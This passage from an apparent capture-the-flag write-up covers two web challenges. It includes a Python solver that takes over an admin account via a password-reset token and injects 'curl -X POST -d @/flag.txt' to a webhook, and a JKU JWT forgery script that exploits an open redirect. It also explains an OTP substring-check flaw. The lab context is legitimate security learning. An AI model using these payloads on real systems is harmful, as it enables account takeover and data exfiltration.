class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resetPassword</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/reset-password/&quot;</span>, json=&#123;<span class="string">&quot;token&quot;</span>: token, <span class="string">&quot;newPassword&quot;</span>: <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="variable language_">self</span>.adminEmail&#125;).text</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/login&quot;</span>, json=&#123;<span class="string">&quot;email&quot;</span>: <span class="variable language_">self</span>.adminEmail, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;aa&quot;</span>&#125;)</span><br><span class="line">        <span class="variable language_">self</span>.c.headers[<span class="string">&quot;Cookie&quot;</span>] = resp.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Logged in as admin; cookies: <span class="subst">&#123;self.c.headers[<span class="string">&#x27;Cookie&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">commandInjection</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/weapons/dispatch&quot;</span>, json=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;gedagedigedagedao&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">100.97</span>, <span class="string">&quot;note&quot;</span>: <span class="string">f&quot;![INJECTED](https://google.com ; curl -X POST -d @/flag.txt <span class="subst">&#123;self.webhook&#125;</span>)&quot;</span>, <span class="string">&quot;dispatched_to&quot;</span>: <span class="string">&quot;mariaban&quot;</span>&#125;).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MAIL</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deleteAllVerif</span>(<span class="params">self</span>):</span><br><span class="line">        r = httpx.get(<span class="string">&quot;http://localhost:8080/deleteall&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getVerifCode</span>(<span class="params">self</span>):</span><br><span class="line">        response = httpx.get(<span class="string">&quot;http://localhost:8080/&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            td = soup.find(<span class="string">&#x27;td&#x27;</span>, text=<span class="keyword">lambda</span> t: t <span class="keyword">and</span> <span class="string">&#x27;Use this token to reset your password: &#x27;</span> <span class="keyword">in</span> t)</span><br><span class="line">            <span class="keyword">if</span> td:</span><br><span class="line">                verification_code = td.text.split(<span class="string">&#x27;Use this token to reset your password: &#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Verification Code: <span class="subst">&#123;verification_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> verification_code</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Verification code not found.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch the page. Status code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">webhook = <span class="built_in">input</span>(<span class="string">&quot;Enter your webhook: &quot;</span>)</span><br><span class="line">api = API(<span class="string">&quot;http://localhost:1337&quot;</span>, webhook)</span><br><span class="line">mail = MAIL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    mail.deleteAllVerif()</span><br><span class="line">    <span class="built_in">print</span>(api.register())</span><br><span class="line">    <span class="built_in">print</span>(api.resetPasswordRequest())</span><br><span class="line">    verifcode = mail.getVerifCode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reset admin password using the verification code</span></span><br><span class="line">    <span class="built_in">print</span>(api.resetPassword(verifcode))</span><br><span class="line">    api.login()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#inject command in markdown</span></span><br><span class="line">    stat = api.commandInjection()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;successfully&quot;</span> <span class="keyword">in</span> stat:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Command injection successful, check your webhook :D&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Web-Breaking"><a href="#Web-Breaking" class="headerlink" title="Web Breaking"></a>Web Breaking</h2><blockquote>
<p>Difficulity: <strong>Easy</strong></p>
</blockquote>
<h3 id="Vulnerability-1"><a href="#Vulnerability-1" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><ul>
<li>Open Redirect</li>
<li>Forged JWT via JKU Modification</li>
<li>OTP Broken Logic</li>
</ul>
<h3 id="Challenge-Introduction"><a href="#Challenge-Introduction" class="headerlink" title="Challenge Introduction"></a>Challenge Introduction</h3><p>Given a web with this functionality:</p>
<ul>
<li>Register and Login</li>
<li>Make Friends (request, accept, cancle, deny)</li>
<li>Get Analytics, and Redirects</li>
<li>Get Current User Balance</li>
<li>Make Transactions</li>
<li>etc</li>
</ul>
<p>The task is to drain the admin privilleged user <code>financial-controller@frontier-board.htb</code> CLCR coin, which if we then access the dashboard, we will be served with the flag. Below is the <code>/api/dashboard</code> endpoint and the flag service:</p>
<p>&#x2F;api&#x2F;dashboard</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; checkFinancialControllerDrained &#125; <span class="keyword">from</span> <span class="string">&#x27;../services/flagService.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">dashboardRouter</span>(<span class="params">fastify</span>) &#123;</span><br><span class="line">    fastify.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_">async</span> (req, reply) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">user</span>) &#123;</span><br><span class="line">            reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Unauthorized: User not authenticated&#x27;</span> &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123; email &#125; = req.<span class="property">user</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!email) &#123;</span><br><span class="line">            reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Email not found in token&#x27;</span> &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123; drained, flag &#125; = <span class="keyword">await</span> <span class="title function_">checkFinancialControllerDrained</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (drained) &#123;</span><br><span class="line">            reply.<span class="title function_">send</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Welcome to the Dashboard!&#x27;</span>, flag &#125;);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        reply.<span class="title function_">send</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Welcome to the Dashboard!&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flagService.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getBalancesForUser &#125; <span class="keyword">from</span> <span class="string">&#x27;./coinService.js&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs/promises&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FINANCIAL_CONTROLLER_EMAIL</span> = <span class="string">&quot;financial-controller@frontier-board.htb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Checks if the financial controller&#x27;s CLCR wallet is drained</span></span><br><span class="line"><span class="comment"> * If drained, returns the flag.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">checkFinancialControllerDrained</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> balances = <span class="keyword">await</span> <span class="title function_">getBalancesForUser</span>(<span class="variable constant_">FINANCIAL_CONTROLLER_EMAIL</span>);</span><br><span class="line">    <span class="keyword">const</span> clcrBalance = balances.<span class="title function_">find</span>(<span class="function">(<span class="params">coin</span>) =&gt;</span> coin.<span class="property">symbol</span> === <span class="string">&#x27;CLCR&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clcrBalance || clcrBalance.<span class="property">availableBalance</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> flag = (<span class="keyword">await</span> fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">drained</span>: <span class="literal">true</span>, flag &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">drained</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>To drain the coin, we have to make a transactions from <code>financial-controller@frontier-board.htb</code> (resolved from JWT), to other user. Giving us new problem, to get the admin access.</p>
<h3 id="Admin-Account-Takeover-1"><a href="#Admin-Account-Takeover-1" class="headerlink" title="Admin Account Takeover"></a>Admin Account Takeover</h3><p>The authentication method this application used is using JWT with added JKU in it’s header, below is example of jwt decode structure:</p>
<p>header</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;jku&quot;: &quot;http://127.0.0.1:1337/.well-known/jwks.json&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;063c81d6-99ec-43c4-8789-40337951bf4d&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;email&quot;: &quot;user@mail.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In short the application logic to verify user token is described as below:</p>
<ol>
<li>User send token via <code>Authorization</code> headers.</li>
<li>Is jku attribute exists in header and starts with <a target="_blank" rel="noopener" href="http://127.0.0.1:1337/">http://127.0.0.1:1337</a> ?</li>
<li>Is kid exists in the header and has the same value with the one in the server</li>
<li>Get jwks via accessing url stated in jku value</li>
<li>Get jwk in the url that has the same kid value as stated in the header</li>
<li>Check if it’s algorithm is <code>RS256</code></li>
<li>Generate public key via <code>n</code> and <code>e</code> value in jwk</li>
<li>Verify the JWT using the public key</li>
</ol>
<p>To get admin access, we have to forge our own JWT with our keys. But, by default the jku url is set to <code>http://127.0.0.1:1337/.well-known/jwks.json</code>. Also there’s checking of jku start value as stated in point 2. </p>
<p><em>How can we set the jku with our own if it have to starts with 127.0.0.1:1337 ??</em></p>
<p>At this point, the redirect comes into play. Take a look at this redirect functionaliy in <code>/api/analytics/redirect</code> endpoint:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">analyticsRoutes</span>(<span class="params">fastify</span>) &#123;</span><br><span class="line">    fastify.<span class="title function_">get</span>(<span class="string">&#x27;/redirect&#x27;</span>, <span class="title function_">async</span> (req, reply) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; url, ref &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!url || !ref) &#123;</span><br><span class="line">            <span class="keyword">return</span> reply.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Missing URL or ref parameter&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Should we restrict the URLs we redirect users to?</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">trackClick</span>(ref, <span class="built_in">decodeURIComponent</span>(url));</span><br><span class="line">            reply.<span class="title function_">header</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="built_in">decodeURIComponent</span>(url)).<span class="title function_">status</span>(<span class="number">302</span>).<span class="title function_">send</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;[Analytics] Error during redirect:&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">            reply.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to track analytics data.&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>There is no restriction to where we redirect the request in url param. We can utilize this to serve jwks value that contains our public key in our server. Below is the url used for jku:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1337/api/analytics/redirect?url=[server_ip]&amp;ref=http://127.0.0.1:1337</span><br></pre></td></tr></table></figure>

<p>Cool, now we can forge admin privileged user JWT using our prepared key pair, and served the kid (can be obtained from our jwt), modulus (n) and public exponent (e) in the server, below is example of jwks format served in our server:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">            &quot;kty&quot;: &quot;RSA&quot;,</span><br><span class="line">            &quot;e&quot;: &quot;AQAB&quot;,</span><br><span class="line">            &quot;kid&quot;: &quot;063c81d6-99ec-43c4-8789-40337951bf4d&quot;,</span><br><span class="line">            &quot;use&quot;: &quot;sig&quot;,</span><br><span class="line">            &quot;n&quot;: &quot;ryHnKq491juhzNjYEy7ZMFG6UfqJMoKkmuxLkOSYFLB1hPwIRolFOQG_b0ExFAm2iMCiv4dZ4AWiODfwEoHEgmB9rOmIqi-kDb7-7eplI-MbXGJoc2X6roYh9kfrdVYJOZkhHGcKSDzrFDW0Nr3kQjj1qx6Fb9lIJT-j6I20je02SKh_PgCvDfXU7qy4yVJPUtjnqsjgjTb8ePbwGRmLfZJW12_kiycO0BPgxtzc32AkdF6KGYtYJl5b0032DJfW0GHwW25y_qGgn2PgP67gDwdfKyKDekYra_NLyFtasqlBHaNPS8RsLKCo7scL8y9ls-wtRbrI-6ETa3Cq4aieQQ&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Below is the code to leak the kid, genarate key pair, and Forge JWT and JWKS:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkid</span>(<span class="params">self</span>):</span><br><span class="line">    jwks = <span class="variable language_">self</span>.c.get(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/.well-known/jwks.json&quot;</span>).json()</span><br><span class="line">    kid = jwks[<span class="string">&quot;keys&quot;</span>][<span class="number">0</span>][<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> kid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys</span>(<span class="params">self</span>):</span><br><span class="line">    private_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(private_key.private_bytes(</span><br><span class="line">            encoding=serialization.Encoding.PEM,</span><br><span class="line">            <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">            encryption_algorithm=serialization.NoEncryption()</span><br><span class="line">        ))</span><br><span class="line"></span><br><span class="line">    public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;public.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(public_key.public_bytes(</span><br><span class="line">            encoding=serialization.Encoding.PEM,</span><br><span class="line">            <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">        ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> public_key</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_n_and_e</span>(<span class="params">self, public_key</span>):</span><br><span class="line">    numbers = public_key.public_numbers()</span><br><span class="line">    n = numbers.n</span><br><span class="line">    e = numbers.e</span><br><span class="line"></span><br><span class="line">    n_b64 = base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    e_b64 = base64.urlsafe_b64encode(e.to_bytes((e.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n_b64, e_b64</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">craftJWT</span>(<span class="params">self</span>):</span><br><span class="line">    public_key = <span class="variable language_">self</span>.generate_rsa_keys()</span><br><span class="line">    n, e = <span class="variable language_">self</span>.extract_n_and_e(public_key)</span><br><span class="line">    kid = <span class="variable language_">self</span>.getkid()</span><br><span class="line"></span><br><span class="line">    jwks = &#123;</span><br><span class="line">        <span class="string">&quot;keys&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">                <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,</span><br><span class="line">                <span class="string">&quot;e&quot;</span>: e,</span><br><span class="line">                <span class="string">&quot;kid&quot;</span>: kid,</span><br><span class="line">                <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,</span><br><span class="line">                <span class="string">&quot;n&quot;</span>: n</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;financial-controller@frontier-board.htb&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">        <span class="string">&quot;kid&quot;</span>: kid,</span><br><span class="line">        <span class="string">&quot;jku&quot;</span>: <span class="string">f&quot;http://127.0.0.1:1337/api/analytics/redirect?url=<span class="subst">&#123;webhook&#125;</span>&amp;ref=http://127.0.0.1:1337&quot;</span>,</span><br><span class="line">        <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;private.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        private_key_data = f.read()</span><br><span class="line"></span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        payload,</span><br><span class="line">        private_key_data,</span><br><span class="line">        algorithm=<span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">        headers=headers</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">self</span>.c.headers[<span class="string">&quot;Authorization&quot;</span>] = <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(jwks).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Use the JWT we forged, and the application will recognize us as <code>financial-controller@frontier-board.htb</code>.</p>
<h3 id="OTP-Broken-Logic"><a href="#OTP-Broken-Logic" class="headerlink" title="OTP Broken Logic"></a>OTP Broken Logic</h3><p>Now our target is to drain the financial-controller CLCR coin, this can be achieved by simply hit the <code>/api/crypto/transaction</code> with POST request, set the target email, amount, and coin type. It’s that simple right? or is it?</p>
<p>Sadly no, there’s a middleware with OTP, where we have to send digits number between 0000 to 9999. The problem is, we don’t know the OTP that only declared in the backend and never sent or exposed via the existing API. Bruteforce it? the middleware wont allow you to send more than 5 times, and there’s also a OTP rotation. Below is the OTP and rate limit middleware:</p>
<p>otpMiddleware.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">otpMiddleware</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">async</span> (req, reply) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = req.<span class="property">user</span>.<span class="property">email</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; otp &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> redisKey = <span class="string">`otp:<span class="subst">$&#123;userId&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> validOtp = <span class="keyword">await</span> <span class="title function_">hgetField</span>(redisKey, <span class="string">&#x27;otp&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!otp) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;OTP is missing.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!validOtp) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;OTP expired or invalid.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Is this secure enough?</span></span><br><span class="line">    <span class="keyword">if</span> (!otp.<span class="title function_">includes</span>(validOtp)) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid OTP.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>rateLimiterMiddleware.js</p>
